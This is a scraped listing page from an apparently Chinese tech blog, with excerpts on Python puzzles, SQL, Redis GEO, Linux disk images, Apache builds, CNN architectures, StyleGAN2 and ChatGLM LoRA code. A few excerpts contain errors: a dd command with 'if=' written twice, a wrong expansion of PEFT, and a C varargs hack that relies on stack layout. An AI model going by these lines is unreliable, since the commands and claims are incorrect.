这条街一共有 2020 位住户，门牌号从 1 到 2020 编号。
小蓝制作门牌的方法是先制作 0 到 9 这几个数字字符，最后根据需要将字符粘贴到门牌上，
例如门牌 1017 需要依次粘贴字符 1、0、1、7，即需要 1 个字符 0，2 个字符 1，1 个字符 7。
请问要制作所有的 1 到 2020 号门牌，总共需要多少个字符 2？
分析： 思路一：
python自带的函数里面就有一个针对字符中出现次数的函数，可以直接调用该函数。（x.count()）
思路二：
先判最低位是否为2，这里采用的是%取余的操作。（比如202%10=2，2022%10=2）
然后再针对次高位判断是否为2，这里采用/取整的操作，不过需要注意的是，202/10的结果不是一个整数，而是一个浮点数，所以这里要取整，即int()一下。
以此类推，写进一个循环即可。
注意：有时函数取整时，要注意要向上取整还是向下取整。
math函数库中的ceil函数是用来向上取整，int()则是用来向下取整。
程序： #思路一： ans = 0 for i in range(1,2021): ans += str(i).count('2') print(ans) #思路二： for i in range(1,2021): ans = 0 x = i while x&gt;0: if x%10 ==2: ans += 1 x = int(x/10) print('门牌号{}含有{}个2'.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42550434cd06a2034f09c04aa8127136/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86253010a9928c96c271d47144d32624/" rel="bookmark">
			题目二：大衍数列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目： 中国古代文献中，曾记载过“大衍数列”, 主要用于解释中国传统文化中的太极衍生原理。
它的前几项是：0、2、4、8、12、18、24、32、40、50 …
其规律是：对偶数项，是序号平方再除2，奇数项，是序号平方减1再除2。
以下的代码打印出了大衍数列的前 100 项
分析： 对偶数项，是序号平方再除2，奇数项，是序号平方减1再除2。
这句话的序号是指从1开始的序号，其他的在无需要注意的地方。
程序： for i in range(1,101): if i % 2 ==0: print('{}'.format(i**2/2)) else: print('{}'.format(((i**2)-1)/2)) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca560664ca5083472d700aaf8370f055/" rel="bookmark">
			从零搭建一套结构光三维重建系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 01 背景介绍
先给大家看一下我们的课程介绍视频：
尽管结构光作为一种已经相当成熟，并且广泛应用的三维重建技术，不同于深度学习，依旧缺乏相关的课程，网上的开源资料寥寥无几，即使有，也是晦涩难懂，许多刚入门的研究者需要花费大量时间入门（其中也不乏笔者本人）。不少这方面的研究生，如果缺少实验室传承，一年学编程技术，一年看文献入门结构光，刚刚迈入科研又要面临找工作的问题了。其实结构光不同于SLAM，并不是一项复杂的技术，相信你看完这门课程后一定会颇有感慨！因而，3D视觉工坊推出课程：[从零搭建一套结构光3D重建系统 [理论+源码+实践]，帮助大家更快地入门结构光技术，助力大家科研！
02 课程大纲 相较之前3D视觉工坊推出的结构光系列课程，该课程更加偏向于工业实战，目的在于帮助大家更快地入门结构光技术，从而更早地独立阅读相关论文。作者对第一期课程中存在的问题和不足进行了改进，大部分内容都得到了更新，讲解更为细致，可操作性更强，而非简单地第一期课程重复！第二期的课程大纲如下：
03 硬件部分 硬件介绍：为了方便同学更快速地入门3D面结构光领域，3D视觉工坊联合课程《从零搭建一套3D结构光扫描仪》的讲师“天涯居士”，联合推出精迅V1（科研级）单目/双目3D结构光扫描仪：
3d结构光扫描仪：「精迅V1」 支持在Windows系统下，直接通过C++（VS2015）SDK代码来控制相机：调整增益、曝光时间、拍照，控制投影仪：写入条纹/格雷码图案（双方向），投影图案并且触发相机拍照。具备以下优势：
便于新手入门：相比较原厂的DLP3010投影仪，该产品直接提供了GUI控制程序，可以直接控制光机投影、相机拍照，教学资料也更为齐全，利于新手入门。
更为灵活布局：相比较其余厂家的3D面结构光扫描仪，布局设计更为灵活，可以根据自己的需求，选择自己定制的相机、投影仪，支持海康的各类USB3.0相机。
提供SDK控制：该产品提供了更底层的C++硬件SDK控制，结合课程《从零搭建一套3d结构光重建系统》，相信你也可以搭建出一套属于自己的实验室级3D扫描仪。
提供3D图纸（额外收费）：你可以在现有的3D图纸的基础上进行修改，更为方便地设计出属于自己的专业3D结构光扫描仪。
详细源码及讲解（额外收费）：你可以在现有源码基础上，更方便地进行二次开发，开发出基于自己的3D结构光扫描仪的衍生产品。
注1：即使不购买相应的硬件，课程同样也提供了提前采集好的数据集，可以完成完整的3D结构光重建。
注2：如果希望单独购买硬件及配套软件，产品介绍及购买链接-&gt;点击这里。
04 课程亮点 本门课程面向实战，带你从零实现一套结构光3D系统，包括一些常见的结构光重建方法。几乎每一个章节都配备有相应的讲义、代码，帮助大家更好地理解结构光技术。例如章节[相移法+多频外差]的部分PPT：
&lt;&lt;&lt; 左右滑动见更多 &gt;&gt;&gt;
再比如[相移法+格雷码]的课件：
&lt;&lt;&lt; 左右滑动见更多 &gt;&gt;&gt;
开课时间 2023年7月15日晚八点（周六），每周更新一章节。
课程答疑 本课程答疑主要在本课程对应的鹅圈子中答疑，学员学习过程中，有任何问题，可以随时在鹅圈子中提问。
▲长按购买课程 ▲长按添加小助理微信：cv3d007，咨询更多 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30b5bb72db11871e6818b56118676cba/" rel="bookmark">
			SQL语法之CASE WHEN的使用总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《SQL语法之CASE WHEN的使用总结》 目录
一、CASE WHEN的语法形态
（一）形态一：CASE WHEN 表达式 THEN 结果 （二）形态二：CASE 变量 WHEN 值 THEN 结果
二、case when的应用场景
（一）SELECT 子句中
（二）WHERE 子句中
（三）GROUP BY 子句中
（四）ORDER BY 子句中
（五）HAVING 子句中
一、CASE WHEN的语法形态 （一）形态一：CASE WHEN 表达式 THEN 结果 基本语法如下 CASE WHEN condition1 THEN result1 WHEN condition2 THEN result2 ... ELSE default_result END 在这个语法中，CASE 表示开始一个 CASE WHEN 表达式，WHEN 表示一个条件分支，THEN 表示条件成立时返回的结果，ELSE 表示所有分支都不成立时返回的默认结果，END 表示结束整个 CASE WHEN 表达式。
condition 可以是任意的逻辑表达式，例如 a &gt; b、c IS NULL 等等。result 可以是任何类型的值，例如数字、字符串、日期等等。在 CASE WHEN 表达式中，可以有任意多个 WHEN 分支，但最多只能有一个 ELSE 分支。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30b5bb72db11871e6818b56118676cba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a549d5abac6f0d421d6b1d736dc530d4/" rel="bookmark">
			ECharts数据可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
第一章 什么是ECharts
第二章 搭建环境 2.1 Echarts的下载
2.2 Visual Studio Code下载
第三章 一个简单的可视化展示
第四章 Echarts组件
4.1 标题
4.2 提示框
4.3 工具栏
4.4 图例
4.5 时间轴
4.6 数据区域缩放
4.6.1 滑动条型数据区域缩放
4.6.2 内置型数据区域缩放 4.6.3 框选型数据区域缩放
4.7 网格
4.8 坐标轴
4.9 数据系列
4.10 全局字体样式
第五章 可视化图
5.1 折线图
5.2 柱状图
5.3 饼图
5.4 散点图
5.5 气泡图
5.6 雷达图
5.7 漏斗图
5.8 仪表盘
5.9 箱线图
5.10 热力图
5.11 旭日图
5.12 桑基图
5.13 词云图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a549d5abac6f0d421d6b1d736dc530d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a2e6e95492aabfff6a840bf1b4bd25e/" rel="bookmark">
			【案例实战】SpringBoot整合Redis的GEO实现查找附近门店功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		像我们平常美团点外卖的时候，都会看到一个商家距离我们多少米。还有类似QQ附近的人，我们能看到附近的人距离我们有多少米。
那么这些业务是怎么做的呢？是如何实现 基于位置的附近服务系统呢。
在去了解基于位置的附近服务之前，我们先来看一下什么是GIS技术。
GIS代表地理信息系统，是一种用于收集、存储、分析、管理和显示地理空间数据的技术。GIS利用计算机软件和硬件来创建、管理、分析和可视化地理信息，使用户能够更好地了解和解决地理空间问题。
简言之地图上的每一个位置都会一个经纬度坐标。根据这个坐标我们查出来附近的人，或者附近的门店之类的。
下面是基于百度的地图经纬度定位系统，大家可以自己体验下，你给它一个经纬度，他能给你定位到地图的某一个点。也就是当前经纬度的位置。
网址：http://jingweidu.757dy.com/
我们既然了解了经纬度这个概念，那么Redis 3.2版本之后新增的一个数据类型，是一种用于处理地理位置信息的数据结构。
GEO(地理位置)：存储和查询地理位置数据，并快速地计算距离和位置集合的交集。
应用场景
位置服务：可以使用GEO结构存储用户或商家的位置信息，并计算用户或商家之间的距离。商业分析：可以使用GEO结构在地图上可视化商家的分布状况，以进行市场分析和营销策略的制定。推荐系统：可以使用GEO结构计算用户与商家之间的距离，以实现根据附近商家推荐和推荐商家位置排名等功能。或者用于实现拼团和卡券等代表性做法，诸如可以实现商家对距离自己较近的用户进行自动优惠券发放等。 Redis的GEO数据结构常见的命令
geoadd：增加某个地理位置的坐标 语法 GEOADD key longitude latitude member geopos：获取某个地理位置的坐标 语法 GEOPOS key [member [member ...]] geodist：获取两个地理位置的距离 语法 GEODIST key member1 member2 [M | KM | FT | MI]范围单位：m | km | ft | mi --&gt; 米 | 千米 | 英尺 | 英里 georadius：根据给定地理位置坐标获取指定范围内的地理位置集合 语法 GEORADIUS key longitude latitude radius &lt;M | KM | FT | MI&gt; georadiusbymember：根据给定地理位置获取指定范围内的地理位置集合。 语法 GEORADIUSBYMEMBER key member radius &lt;M | KM | FT | MI&gt; geohash：获取某个地理位置的geohash值 语法 GEOHASH key [member [member .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a2e6e95492aabfff6a840bf1b4bd25e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/609a820929020605a7ee38d1e7c3f00b/" rel="bookmark">
			R语言之下载安装包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.install.packages(“packagename”)
2.通过Bioconductor
if (!require("BiocManager", quietly = TRUE))
install.packages("BiocManager")#预先安装
若有可以直接使用：BiocManager::install("Packagename")
3.install.packages("devtools")
devtools::install_github('Creatorname/Packagename')
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62ae44f1a4411acf51b1cbf9bdd80180/" rel="bookmark">
			Linux 文件模拟磁盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.整个文件当一个磁盘不分区使用 dd if=/dev/zero if=/home/test.img bs=1M count=512 mkfs -t ext4 /home/test.img #格式化 mount -o loop /home/test.img /dd 或者使用losetup配置为loop设备
dd if=/dev/zero if=/home/test.img bs=1M count=512 losetup -f /home/test.img mkfs -t ext4 /dev/loop1 #格式化 mount -t ext4 /dev/loop1 /dd 2.整个文件当一个磁盘且分区使用 先使用dd或者qemu创建一个空的20G大文件，步骤和第一步一样，然后使用fdisk /var/lib/libvirt/images/openharmony.img 进行分区，分区后如下
sudo fdisk -l /var/lib/libvirt/images/openharmony.img Disk /var/lib/libvirt/images/openharmony.img: 20 GiB, 21474836480 bytes, 41943040 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: EC7875C8-5819-7140-B12F-DDED3C4280FD Device Start End Sectors Size Type /var/lib/libvirt/images/openharmony.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62ae44f1a4411acf51b1cbf9bdd80180/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dc89a7540f991d168958b67605c4dfc/" rel="bookmark">
			Linux：http服务（Apache 2.4.57）源码编译——配置网站 || 入门到入土
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.下载源码包
2.配置httpd运行环境
3.编译源码包安装apache软件
4.优化执行路径
5.添加httpd系统服务
#正文
1.httpd服务器的基本配置
2.Linux命令行访问网站
3. 网站日志
4.控制网站访问 5.创建用户认证数据库
#构建虚拟web主机
1.构建虚拟主机——基于域名
2.构建虚拟主机——基于ip
3.构建虚拟主机——基于端口
我的服务器为centos7系统
1.下载源码包 访问官方网站↓↓↓
Welcome! - The Apache HTTP Server Project
↑↑↑
选择 Download 你可以选择
httpd-2.4.57.tar.bz2
也可以选择
httpd-2.4.57.tar.gz
他俩只是归档压缩的方式不一样，使用解归档的命令也有点差别外就没什么了
我这里选择的是httpd-2.4.57.tar.bz2
直接点击httpd-2.4.57.tar.bz2就会自动下载
将这个文件传入Linux中
2.配置httpd运行环境 现在httpd-2.4.57.tar.bz2已经传入当前工作目录
tar xfj httpd-2.4.57.tar.bz2 -C /usr/src/
# 将他解归档解入/usr/src/
在开始配置编译他之前我们还要做一些准备工作！！！
rpm -e httpd --nodeps
# 如果系统自带httpd这个软件要删除掉，两个软件不能同时运行
yum -y install apr apr-devel cyrus-sasl-devel expat-devel libdb-devel openldap-devel apr-util-devel apr-util pcre-devel pcre gcc make
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6dc89a7540f991d168958b67605c4dfc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33c47a73fa15c3d9d67728172dd57d13/" rel="bookmark">
			奇怪代码-c&#43;&#43;可变参数实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdio.h&gt;
using namespace std;
int add(int n,...)
{
int s=0;
int *p=(&amp;n);
for(int i=0;i&lt;n;i++)
{
p+=2;
s+=*p;
printf("%d:%d\n",p,*p);
}
return s;
}
int main()
{
int s=add(10,1,2,3,4,5,6,7,8,9,10);
printf("%d",s);
return 0;
}
运用指针来访问参数
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/386292d6d2a8b113dc2d4092838fb893/" rel="bookmark">
			（2020，StyleGAN2）分析和提高 StyleGAN 的图像质量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Analyzing and Improving the Image Quality of StyleGAN
公众号：EDPJ
目录
0. 摘要
1. 简介
2. 去除归一化伪影
2.1 重新审视生成器架构
2.2 重新审视实例归一化
3. 图像质量和生成器平滑度 3.1 惰性正则化（Lazy regularization）
3.2 路径长度正则化
4. 重新审视渐进式增长
4.1 替代的网络架构 4.2 分辨率使用
5. 图像到隐空间的投影
5.1 生成图像的属性
6. 结论与未来工作
参考
S. 总结
S.1 核心思想
S.2 网络结构
S.3 其他贡献
0. 摘要 基于样式的 GAN 架构 (StyleGAN) 在数据驱动的无条件生成图像建模中产生了最先进的结果。 我们揭示并分析了它的几个特征伪影（artifacts），并提出了模型架构和训练方法的更改以解决这些问题。 特别是，我们重新设计了生成器归一化（normalization），重新审视渐进式增长（progressive growing），并对生成器进行正则化（regularization），以鼓励在从隐编码到图像的映射中进行良好调节。 除了提高图像质量之外，这种路径长度正则化器还带来了额外的好处，即生成器变得更容易反转（invert）。 这使得将生成的图像可靠地溯源到特定网络成为可能。 我们进一步可视化生成器如何很好地利用其输出分辨率，并确定容量问题，促使我们训练更大的模型以进一步提高质量。 总的来说，我们改进的模型在现有分布质量指标和感知图像质量方面重新定义了无条件图像建模的最新技术水平。
1. 简介 许多观察者已经注意到 StyleGAN 生成的图像中的特征伪影。 我们确定了这些伪影的两个原因，并描述了消除它们的架构和训练方法的变化。
首先，我们调查了常见的类似小斑点的伪影的来源，并发现生成器创建它们是为了规避其体系结构中的设计缺陷。 在第 2 节中，我们重新设计了生成器中使用的规范化，它删除了伪影。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/386292d6d2a8b113dc2d4092838fb893/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/747cae1af05f3f8e443ddc35631898c3/" rel="bookmark">
			轻量化CNN模型整理—MobileNet，ShuffleNet，GhostNet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		卷积神经网络（Convolutional Neural Networks, CNNs）由于其强大的表征学习能力，在计算机视觉领域取得了瞩目的成就，并得到了广泛的应用。为了进一步提高网络的精度，目前CNN的整体发展趋势是向着更深、更复杂的网络发展，但也因此导致了更高的计算代价。而在实际应用中，网络可能需要部署在计算资源有限的平台上，因此简化网络参数、减少网络计算量、提高网络效率也成为卷积网络研究的一个方向。目前轻量化网络研究主要包括以下几个思路：（1）压缩预训练的网络，如通过剪枝(pruning)、乘积量化(product quantization)、矢量量化(vector quantization)、哈希编码、霍夫曼编码等方式实现网络计算量压缩；（2）设计具有更少参数及计算量的高效网络模型，如SquezeNet、Deep fried convnets 、MobileNet、ShuffleNet、GhostNet等；（3）模型蒸馏（distillation），基于预训练的大规模网络引导训练更小规模的网络。
本文主要整理了轻量化网络结构设计研究中的几个经典网络模型：MobileNet[1]、ShuffleNet[2]和GhostNet[3]。
1. 常规卷积网络 在介绍轻量化网络模型前，先对常规卷积网络的操作做一回顾。常规卷积网络中，一个卷积层包含若干个滤波器（filters），每个滤波器包含若干个滤波矩阵，即卷积核（kernels）。一个滤波器对输入的操作如图1所示（忽略偏置计算），对于3通道的输入，一个滤波器将包含3个卷积核，每个卷积核对输入的一个通道进行卷积，各卷积核计算结果相加，得到一个输出特征图。当采用多个滤波器时，即可得到多通道的输出特征图。
图1 常规卷积运算 常规卷积层的计算量（乘加操作数）为 。其中H，W，C分别为输入的高、宽及通道数，N为输出通道数（即滤波器数），k为卷积核尺寸。
2. MobileNet MobileNet由Google团队提出，旨在提供一种适用于计算资源有限的移动设备的卷积网络。其核心是卷积层采用深度可分离卷积（Depthwise separable convolution）。
由第1节回顾可以发现常规卷积层操作其实可以分成两步。第一步是对输入各通道进行卷积滤波，第二步是对第一步结果线性组合。由于常规卷积层中这两步操作并不解耦，因此每个滤波器的卷积核参数并不相同，卷积时需要独立计算，当各层输出特征图通道数增加（即增大）时计算量显著增大。
深度可分离卷积的基本思路是将常规卷积层的两步操作解耦，即逐通道卷积（Depthwise convolution）和逐点卷积（Pointwise convolution），如图2所示。具体操作如下：
（1）逐通道卷积实现深度方向的空间卷积。这一步中输入的每个通道对应一个卷积核，通过卷积操作得到和输入通道数C相同通道的输出。这一步可以看做只采用1个包含C个卷积核的滤波器对输入各通道分别卷积滤波但不求和。也可以看做C个滤波器，每个滤波器仅包含对应单通道的1个卷积核，相当于极端的分成C组的分组卷积（Group convolution）。该步的计算量为。
（2）接着逐点卷积将逐通道卷积结果各通道进行组合的卷积。这一步可以看做对逐通道卷积输出结果进行常规的卷积操作，但卷积核尺寸固定为1*1，从而实现逐点的线性组合。这一步中滤波器数量可以自己设定，从而可以输出通道数为的特征图。该步的计算量为，这里假设逐通道卷积输出与输入尺寸相同。
图2 深度可分离卷积运算 综上一个深度可分离卷积层的计算量为，相比具有相同输出特征图的常规卷积层其计算量减少为原来的倍。
图3给出了MobileNet中采用的深度可分离卷积层结构和MobileNet整体结构。可以注意到MobileNet采用的深度可分离卷积在逐通道卷积和逐点卷积后均跟随Batch Normalization和ReLU激活函数。也有其他一些采用深度可分离卷积的方法尽在逐点卷积后进行Batch Normalization和ReLU激活。此外后续研究中MobileNet也有了更新的版本，如MobileNet V2，MobileNet V3，感兴趣的读者可以自行研究。
图3 MobileNet结构[1] 3. ShuffleNet ShuffleNet是旷视科技提出的应用于移动设备的高效CNN模型。其作者注意到此前的运用深度可分离卷积的方法中1*1的逐点级卷积（Pointwise convolution）占用大量的计算资源。一个直接的解决思路是利用通道稀疏连接的方法，如分组卷积（Group convolution），来降低其计算复杂度。
分组卷积实际上早在AlexNet中就有使用，其基本思路是将输入特征图分为g组，每组内分别进行常规卷积，如图4（a）。由于每组输入和输出的通道数均变为原本的1/g，总计算量变为常规卷积的1/g。但是分组卷积存在的一个问题是一组输出只与本组内的输入有关，不同组间缺乏信息交互，可能会降低模型表征能力。
图4 两层的分组卷积及通道混洗分组卷积[2] (a) 分组卷积；(b), (c) 通道混洗分组卷积 为了解决分组卷积组间信息无法交互的问题，ShuffleNet提出一种采用通道间混洗（Channel shuffle）的分组卷积。在一层分组卷积得到输出后，对各组输出均匀打乱，使得下一层分组卷积中各分组的特征图来自上一层不同组的输出，从而实现不同分组间信息交互，如图4（b）及（c）。具体实现中，如图5所示，通过简单的维度变换（Reshape）和转置（Transpose）即可实现通道混洗：首先将上一层输出的通道数g×n维度变化为（g, n），接着转置为（n, g），最后重新维度变化为g×n。综上通过通道混洗的分组卷积一方面降低了计算量，一方面实现了通道间的信息交互。
图5 具体的通道混洗操作 在此基础上原文参考残差网络的bottleneck设计给出包含和不包含下采样的两个ShuffleNet Unit，如图6。
图6 ShuffleNet Unit[2] (a) 具有Depthwise Conv的bottleneck; (b) ShuffleNet Unit, stride=1; (c)ShuffleNet Unit, stride=2 进一步的，给出不同分组数的ShuffleNet如图7。此外后续研究中ShuffleNet也有了更新的版本，如ShuffleNet V2，感兴趣的读者可以自行研究。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/747cae1af05f3f8e443ddc35631898c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62c5a4d0a5cd1a2350591a1c772b1d26/" rel="bookmark">
			docker安装mosquitto
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.docker拉取
docker pull eclipse-mosquitto 2.查看镜像
docker images 3.建立配置目录
mkdir -p /mosquitto/config mkdir -p /mosquitto/data mkdir -p /mosquitto/log 4.建立配置文件，大部分教程缺少：listener 1883
vi /mosquitto/config/mosquitto.conf 写入以下内容 persistence true persistence_location /mosquitto/data log_dest file /mosquitto/log/mosquitto.log listener 1883 allow_anonymous false #关闭匿名模式 password_file /mosquitto/config/pwfile.conf #指定密码文件 5.为目录授权
chmod -R 755 /mosquitto chmod -R 777 /mosquitto/log #日志目录要最大权限 6.建立运行脚本mosquitto.sh
docker run -it --name=mosquitto --privileged -p 1883:1883 -p 9001:9001 -v /mosquitto/config/mosquitto.conf:/mosquitto/config/mosquitto.conf -v /mosquitto/data:/mosquitto/data -v /mosquitto/log:/mosquitto/log -d eclipse-mosquitto 提示【Error: Unable to open log file /mosquitto/log/mosquitto.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62c5a4d0a5cd1a2350591a1c772b1d26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65b510d273c915111bed60199564197b/" rel="bookmark">
			有三个线程，分别只能打印A，B和C要求按顺序打印ABC，打印10次(多种方法,小白也懂)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
第一种方法:使用LockSupport的park和unpark功能(推荐)
第二种方式:synchronized+wait+notify
第三种:暴力循环方法(不推荐)
第一种方法:使用LockSupport的park和unpark功能(推荐) 简单来说我们有一个名为LockSupport的方法
park就是阻塞当前进程
unpark就是取消阻塞让其继续执行
我们要循环打印ABC三个线程的三个字母
那么我们就可以让三个线程按顺序阻塞和解锁,就能完成打印
代码
import java.util.concurrent.locks.LockSupport; public class demo2 { static Thread t1,t2,t3; public static void main(String[] args) { t1 = new Thread(()-&gt;{ for (int i = 0; i &lt; 10; i++) { LockSupport.park(); System.out.print("A"); LockSupport.unpark(t2); } }); t2 = new Thread(()-&gt;{ for (int i = 0; i &lt; 10; i++) { LockSupport.park(); System.out.print("B"); LockSupport.unpark(t3); } }); t3 = new Thread(()-&gt;{ for (int i = 0; i &lt; 10; i++) { LockSupport.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65b510d273c915111bed60199564197b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aebec994845ed94b2b8a03ed0783b529/" rel="bookmark">
			数组的应用之单位转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		比如：把Byte转换成MB。
现在有3145728Byte，要转换成MB该如何用代码实现呢？
定义单位数组：首先我们用数组存储若干个单位，从小到大依次是“Byte”，“KB”，“MB”, “GB”。
定义指向当前单位的变量：再使用一个变量存储当前单位在数组中的索引，很明显当前单位为Byte，所以变量指向数组中第一个元素的索引值：0。
循环除：再想想Byte到MB要做哪些数学运算？要做的就是除2次1024。
调整变量：另外我们在除1024后，单位提升了一阶，所以要把变量加1，指向在数组中更高一阶的单位。
伪代码：
val = 3145728 arr = [Byte, KB, MB] curIndex = 0 for(i=0;i&lt; arr.len; i++) { val = val/1024 curIndex++ if(arr[i] == MB) { break; } } print(val) // 3 print(arr[curIndex]) // MB 其他形式的单位转换，都可以用类似的代码实现，包括：长度单位、功率单位和汇率单位等。
在这种案例中需要用一个线性数据结构存储单位，方便在单位换算时调整指针指向不同的单位，而数组是一个不错的选择。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e9c62c873a271a1f7c70504f9ea1596/" rel="bookmark">
			STM32 HAL库开发——入门篇（2）：定时器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、TIMER定时器概述
1.1 软件定时原理
1.2 定时器定时原理
1.3 STM32定时器分类
1.4 STM32定时器特性表
1.5 STM32基本、通用、高级定时器功能整体的区别
二、基本定时器
2.1 基本定时器简介
2.3 STM32定时器计数模式及溢出条件
2.4 定时器中断实验相关寄存器
2.5 定时器溢出时间计算方法
2.6 定时器中断实验配置步骤
2.7 编程实战：定时器中断实验
三、通用定时器
3.1 通用定时器简介
3.2 通用定时器框图 3.3 计数器时钟源
3.3.1 外部时钟模式1
3.3.2 外部时钟模式2
3.3.3 内部触发输入 3.4 通用定时器PWM输出实验
3.4.1 通用定时器输出比较部分框图
3.4.2 通用定时器输出PWM原理
3.4.3 PWM模式
3.4.4 通用定时器PWM输出实验配置步骤
3.4.5 编程实战：通用定时器PWM输出实验
3.5 通用定时器输入捕获实验
3.5.1 通用定时器输入捕获部分框图
3.5.2 通用定时器输入捕获脉宽测量原理
3.5.4 编程实战：通用定时器输入捕获实验
3.6 通用定时器脉冲计数实验
3.6.1 脉冲计数实验原理
3.6.2 通用定时器脉冲计数实验配置步骤
3.6.3 编程实战：通用定时器脉冲计数实验
四、高级定时器
4.1 高级定时器简介
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e9c62c873a271a1f7c70504f9ea1596/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecc06b35395001cbb75cc6b1c4f41a51/" rel="bookmark">
			ChatGLM-6B tuning 推理源码解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		from peft import LoraConfig, get_peft_model, TaskType def load_lora_config(model): config = LoraConfig( task_type=TaskType.CAUSAL_LM, inference_mode=False, r=8, lora_alpha=32, lora_dropout=0.1, target_modules=["query_key_value"] ) return get_peft_model(model, config) tokenizer = AutoTokenizer.from_pretrained("../ChatGLM-Tuning-master/chatglm-6b", trust_remote_code=True) from transformers import AutoModel import torch model = AutoModel.from_pretrained("../ChatGLM-Tuning-master/chatglm-6b", trust_remote_code=True).half().cuda() from peft import PeftModel model = PeftModel.from_pretrained(model, "../ChatGLM-Tuning-master/output").half() 这段代码主要涉及到使用PEFT（Parallel Efficient Transformers）模型进行任务处理和推理。下面逐行解释代码的功能：
导入必要的库和模块：
javascriptCopy code
from peft import LoraConfig, get_peft_model, TaskType 该行代码导入了LoraConfig、get_peft_model和TaskType等相关功能函数。
定义加载PEFT模型配置的函数：
arduinoCopy code
def load_lora_config(model): config = LoraConfig( task_type=TaskType.CAUSAL_LM, inference_mode=False, r=8, lora_alpha=32, lora_dropout=0.1, target_modules=["
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecc06b35395001cbb75cc6b1c4f41a51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a427bbd563dd25f8cac50d46a77261da/" rel="bookmark">
			Vue.js3.0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
